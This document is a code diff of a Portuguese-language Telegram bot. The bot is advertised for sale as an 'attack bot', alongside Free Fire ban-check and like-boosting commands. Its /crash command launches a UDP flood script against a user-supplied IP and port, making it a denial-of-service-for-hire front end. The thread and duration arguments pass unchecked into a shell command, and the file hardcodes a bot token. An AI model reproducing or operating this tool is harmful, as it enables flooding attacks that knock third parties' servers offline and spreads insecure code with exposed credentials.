@@ -1,161 +1,208 @@
-import os
-import subprocess
 import telebot
-import requests
+import subprocess
+import re
+import time
 from threading import Thread
+import requests
 
-# Token e ID do dono
-BOT_TOKEN = '7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8'
-OWNER_ID = 6430703027
-
-# Inicialização do bot
+BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
+SEU_ID_TELEGRAM = 6430703027
 bot = telebot.TeleBot(BOT_TOKEN)
+processos = {}
+usuarios = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
+vip_usuarios = []  # Lista de usuários VIP
 
-# Listas de usuários
-authorized_users = [OWNER_ID]
-vip_users = []
-vip_commands = []
-processes = []  # Lista para armazenar processos ativos
-MAX_ATTACKS = 3  # Limite de ataques simultâneos
+# Função para validar o formato do IP:PORTA
+def validar_ip_porta(ip_porta):
+    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
+    match = re.match(padrao, ip_porta)
+    return match is not None
 
+# Função para executar o comando
+def executar_comando(ip_porta, threads, tempo):
+    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
+    try:
+        processo = subprocess.Popen(
+            comando_terminal, 
+            shell=True, 
+            stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE
+        )
+        processos[ip_porta] = processo
+        time.sleep(int(tempo))
+        processo.terminate()
+        return f"Comando para {ip_porta} concluído ou interrompido após {tempo} segundos."
+    except Exception as e:
+        return f"Erro ao executar o comando: {str(e)}"
 
-# Função para gerenciar o limite de ataques simultâneos
-def manage_attacks():
-    if len(processes) >= MAX_ATTACKS:
-        oldest_process = processes.pop(0)
-        if oldest_process.poll() is None:  # Verifica se o processo ainda está ativo
-            oldest_process.terminate()
+# Comando /start com mensagem de menu mais bonita
+@bot.message_handler(commands=['start'])
+def start_message(message):
+    bot.reply_to(
+        message, 
+        "🌟 **Bem-vindo ao Bot de Ataques!** 🌟\n\n"
+        "Olá, **{0}**! Eu sou o seu assistente virtual para testes de servidores. Aqui estão os **comandos disponíveis** para você:\n\n"
+        
+        "🛠️ **/crash <IP:PORTA> <threads> <tempo>** - Iniciar um ataque ao servidor 🚀\n"
+        "🔒 **/adduser <ID>** - Adicionar um novo usuário (Admin+)\n"
+        "❌ **/removeuser <ID>** - Remover um usuário (Admin+)\n"
+        "💎 **/addvip <ID>** - Tornar um usuário VIP (Apenas o dono)\n"
+        "💔 **/removevip <ID>** - Remover o status de VIP de um usuário (Apenas o dono)\n"
+        "🔍 **/checkban <ID>** - Verificar se uma conta de Free Fire está banida 🚫\n"
+        "💳 **/comprarbot** - Saiba como comprar este incrível bot! 💸\n\n"
+        
+        "📚 Caso precise de ajuda com qualquer comando, é só me chamar! Estou sempre por aqui 😎\n\n"
+        "👑 **Dono**: {1}\n\n"
+        "👥 **Usuários atuais**: {2}\n\n"
+        "🎯 **Deseja iniciar um ataque?** Só digitar o comando e vamos lá! 💥".format(
+            message.from_user.first_name,
+            SEU_ID_TELEGRAM,
+            len(usuarios)
+        )
+    )
 
-
-# Comando /likes (atualizado)
-@bot.message_handler(commands=['likes'])
-def send_likes(message):
-    msg_split = message.text.split()
-    if len(msg_split) < 2:
-        bot.send_message(message.chat.id, "❌ Uso correto: /likes <ID>")
+# Comando /crash
+@bot.message_handler(commands=['crash'])
+def crash_server(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.reply_to(message, "Acesso negado.")
         return
+    try:
+        comando = message.text.split()
+        if len(comando) < 4:
+            bot.reply_to(message, "Uso: /crash <IP:PORTA> <threads> <tempo>")
+            return
+        ip_porta = comando[1]
+        threads = comando[2]
+        tempo = comando[3]
+        if not validar_ip_porta(ip_porta):
+            bot.reply_to(message, "Formato inválido de IP:PORTA.")
+            return
+        bot.reply_to(message, f"Iniciando ataque para {ip_porta}...")
+        thread = Thread(target=executar_comando, args=(ip_porta, threads, tempo))
+        thread.start()
+        bot.reply_to(message, f"Comando enviado! O ataque começará para {ip_porta}.")
+    except Exception as e:
+        bot.reply_to(message, f"Erro: {str(e)}")
 
-    player_id = msg_split[1]
-    default_quantity = 100
+# Comando /adduser
+@bot.message_handler(commands=['adduser'])
+def add_user(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.reply_to(message, "Acesso negado. Apenas o dono pode adicionar usuários.")
+        return
+    try:
+        comando = message.text.split()
+        if len(comando) < 2:
+            bot.reply_to(message, "Uso: /adduser <ID do usuário>")
+            return
+        user_id = int(comando[1])
+        if user_id not in usuarios:
+            usuarios.append(user_id)
+            bot.reply_to(message, f"Usuário {user_id} adicionado com sucesso!")
+        else:
+            bot.reply_to(message, "Este usuário já está na lista.")
+    except Exception as e:
+        bot.reply_to(message, f"Erro: {str(e)}")
 
-    bot.send_message(message.chat.id, f"✨ Enviando {default_quantity} likes para o jogador {player_id}. Aguarde...")
+# Comando /removeuser
+@bot.message_handler(commands=['removeuser'])
+def remove_user(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.reply_to(message, "Acesso negado. Apenas o dono pode remover usuários.")
+        return
+    try:
+        comando = message.text.split()
+        if len(comando) < 2:
+            bot.reply_to(message, "Uso: /removeuser <ID do usuário>")
+            return
+        user_id = int(comando[1])
+        if user_id in usuarios:
+            usuarios.remove(user_id)
+            bot.reply_to(message, f"Usuário {user_id} removido com sucesso!")
+        else:
+            bot.reply_to(message, "Este usuário não está na lista.")
+    except Exception as e:
+        bot.reply_to(message, f"Erro: {str(e)}")
 
-    def process_likes():
-        api_url = f"https://api.nowgarena.com/api/send_likes?uid={player_id}&quantity={default_quantity}&key=projetoswq"
-        try:
-            response = requests.get(api_url)
-            data = response.json()
+# Comando /addvip
+@bot.message_handler(commands=['addvip'])
+def add_vip(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.reply_to(message, "Acesso negado. Apenas o dono pode adicionar VIPs.")
+        return
+    try:
+        comando = message.text.split()
+        if len(comando) < 2:
+            bot.reply_to(message, "Uso: /addvip <ID do usuário>")
+            return
+        user_id = int(comando[1])
+        if user_id not in vip_usuarios:
+            vip_usuarios.append(user_id)
+            bot.reply_to(message, f"Usuário {user_id} promovido a VIP!")
+        else:
+            bot.reply_to(message, "Este usuário já é VIP.")
+    except Exception as e:
+        bot.reply_to(message, f"Erro: {str(e)}")
 
-            if data.get("success"):
-                bot.send_message(
-                    message.chat.id,
-                    f"✅ {default_quantity} likes enviados com sucesso para o jogador {player_id}!",
-                    parse_mode="Markdown"
-                )
-            else:
-                bot.send_message(
-                    message.chat.id,
-                    "❌ Não foi possível enviar likes. Tente novamente mais tarde.",
-                    parse_mode="Markdown"
-                )
-        except Exception:
-            bot.send_message(
-                message.chat.id,
-                "❌ Erro ao processar a solicitação. Tente novamente mais tarde.",
-                parse_mode="Markdown"
-            )
+# Comando /removevip
+@bot.message_handler(commands=['removevip'])
+def remove_vip(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.reply_to(message, "Acesso negado. Apenas o dono pode remover VIPs.")
+        return
+    try:
+        comando = message.text.split()
+        if len(comando) < 2:
+            bot.reply_to(message, "Uso: /removevip <ID do usuário>")
+            return
+        user_id = int(comando[1])
+        if user_id in vip_usuarios:
+            vip_usuarios.remove(user_id)
+            bot.reply_to(message, f"Usuário {user_id} removido de VIP.")
+        else:
+            bot.reply_to(message, "Este usuário não é VIP.")
+    except Exception as e:
+        bot.reply_to(message, f"Erro: {str(e)}")
 
-    # Executa em uma nova thread
-    Thread(target=process_likes).start()
-
-
-# Comando /checkban (atualizado)
+# Comando /checkban
 @bot.message_handler(commands=['checkban'])
 def check_ban(message):
-    msg_split = message.text.split()
-    if len(msg_split) < 2:
-        bot.send_message(message.chat.id, "❌ Uso correto: /checkban <ID do jogador>")
-        return
+    try:
+        comando = message.text.split()
+        if len(comando) < 2:
+            bot.reply_to(message, "Uso: /checkban <ID do jogador>")
+            return
+        player_id = comando[1]
+        bot.reply_to(message, "🔍 Analisando a conta, por favor aguarde...")
 
-    player_id = msg_split[1]
-    bot.send_message(message.chat.id, "🔍 *Analisando a conta, por favor aguarde...*", parse_mode="Markdown")
-
-    def process_checkban():
         api_url = f"https://api.nowgarena.com/api/check_banned?uid={player_id}"
-        try:
-            response = requests.get(api_url)
-            data = response.json()
+        response = requests.get(api_url)
+        data = response.json()
 
-            if data.get("status") == "success":
-                is_banned = data.get("isBanned")
-                if is_banned == "no":
-                    bot.send_message(
-                        message.chat.id,
-                        f"✅ *A conta não está banida!*\n\n🆔 ID: {data.get('uid')}",
-                        parse_mode="Markdown"
-                    )
-                elif is_banned == "yes":
-                    period = data.get("period", "indefinido")
-                    bot.send_message(
-                        message.chat.id,
-                        f"🚫 *A conta está banida!*\n\n🆔 ID: {data.get('uid')}\n⏳ Período: {period} dias",
-                        parse_mode="Markdown"
-                    )
-                else:
-                    bot.send_message(message.chat.id, "❌ *Erro ao verificar a conta. Tente novamente mais tarde.*", parse_mode="Markdown")
-            else:
-                bot.send_message(message.chat.id, "❌ *Erro ao processar a solicitação. Tente novamente mais tarde.*", parse_mode="Markdown")
-        except Exception as e:
-            bot.send_message(message.chat.id, f"❌ *Erro ao processar a solicitação: {str(e)}*", parse_mode="Markdown")
-
-    # Executa em uma nova thread
-    Thread(target=process_checkban).start()
-
-
-# Comando /start (revisado)
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    welcome_text = (
-        "🤖 Bem-vindo ao bot! 🎉\n\n"
-        "📋 *Comandos disponíveis:*\n"
-        "/crash <IP:PORT> <porta> <duração> - Envia um ataque ao IP especificado ⚡\n"
-        "/meuid - Mostra seu ID de usuário 🆔\n"
-        "/comprarbot - Link para comprar o bot 🛒\n"
-        "/info <ID> - Informações da conta do jogador de Free Fire 🕹️\n"
-        "/checkban <ID> - Verificar se o jogador está banido 🚫\n"
-        "/evento - Exibe eventos do Free Fire 🎉\n"
-        "/likes <ID> - Envia 100 likes para o jogador 👍\n"
-        "/listusers - Lista os usuários registrados 🔍\n\n"
-        "👑 *Comandos para VIPs e dono:*\n"
-        "/adduser <ID> - Adiciona um usuário autorizado ✅\n"
-        "/removeuser <ID> - Remove um usuário autorizado ❌\n"
-        "/promovervip <ID> - Promove um usuário a VIP 🌟\n"
-        "/rebaixarvip <ID> - Remove o status de VIP de um usuário 🔻\n\n"
-        "🔒 *Comandos exclusivos do dono:*\n"
-        "/addcomandovip <comando> - Restringe um comando para VIPs ⚠️\n"
-        "/revcomandovip <comando> - Remove a restrição de comando VIP 🔓"
-    )
-    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
-
-
-# Comando /meuid
-@bot.message_handler(commands=['meuid'])
-def send_user_id(message):
-    bot.send_message(message.chat.id, f"🆔 Seu ID de usuário é: {message.from_user.id}")
-
+        if data.get("status") == "success":
+            is_banned = data.get("isBanned")
+            if is_banned == "no":
+                bot.reply_to(
+                    message,
+                    f"✅ *A conta não está banida!*\n\n🆔 ID: {data.get('uid')}",
+                    parse_mode="Markdown"
+                )
+            elif is_banned == "yes":
+                period = data.get("period", "indefinido")
+                bot.reply_to(
+                    message,
+                    f"🚫 *A conta está banida!*\n\n🆔 ID: {data.get('uid')}\n⏳ Período: {period} dias",
+                    parse_mode="Markdown"
+                )
+        else:
+            bot.reply_to(message, "❌ *Erro ao processar a solicitação. Tente novamente mais tarde.*", parse_mode="Markdown")
+    except Exception as e:
+        bot.reply_to(message, f"❌ *Erro ao processar a solicitação: {str(e)}*", parse_mode="Markdown")
 
 # Comando /comprarbot
 @bot.message_handler(commands=['comprarbot'])
-def buy_bot(message):
-    bot.send_message(
-        message.chat.id,
-        "🛒 *Adquira o bot agora!*\n\n"
-        "📩 Entre em contato comigo pelo Telegram para comprar:\n"
-        "👉 [Clique aqui para comprar](https://t.me/werbert_ofc)",
-        parse_mode="Markdown"
-    )
+def comprar_bot(message):
+    bot.reply_to(message, "💸 Para comprar o bot, entre em contato com o dono do bot.")
 
-
-# Inicia o bot
-if __name__ == "__main__":
-    bot.polling(none_stop=True)
+bot.polling()
